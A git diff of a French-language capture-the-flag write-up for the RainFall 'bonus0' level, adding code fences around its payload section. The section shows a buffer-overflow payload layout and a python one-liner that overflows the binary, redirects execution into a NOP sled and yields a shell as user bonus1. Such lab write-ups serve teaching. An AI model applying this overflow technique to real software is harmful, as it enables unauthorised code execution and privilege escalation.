@@ -104,12 +104,14 @@ Maintenant pour faire executer notre payload, il faudra passer par un fichier ce
 
 
 ## Payload
-
+```
 [Padding de 4095] + ["\n" Pour ne pas segfault lors de strchr] + [Padding de 9] + [Adrresse dans le nop sled] + [Padding pour segfault]
-
+```
+```
 bonus0@RainFall:~$ (python -c 'print("A" * 4095 + "\n" + "A" * 9 + "\x1d\xf3\xff\xbf" + "A" * 7)') > payload; cat payload - | ./bonus0
  - 
  - 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA��� AAAAAAAAA���AAAAAAA���
 whoami
 bonus1
+```
